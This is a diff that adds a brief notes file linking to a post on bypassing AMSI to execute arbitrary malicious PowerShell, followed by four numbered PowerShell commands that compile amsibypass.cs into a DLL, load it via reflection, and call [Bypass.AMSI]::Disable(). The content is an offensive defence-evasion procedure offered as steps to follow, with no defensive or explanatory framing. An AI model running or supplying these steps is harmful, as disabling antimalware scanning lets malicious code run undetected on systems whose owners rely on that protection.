@@ -1,0 +1,7 @@
+https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
+
+
+0 - Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\amsibypass.cs")) -OutputAssembly "amsibypass.dll" -- To compile C# in PowerSH
+1 - [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\amsibypass.dll"))
+2 - [Bypass.AMSI]  --- To confirm
+3 - [Bypass.AMSI]::Disable()
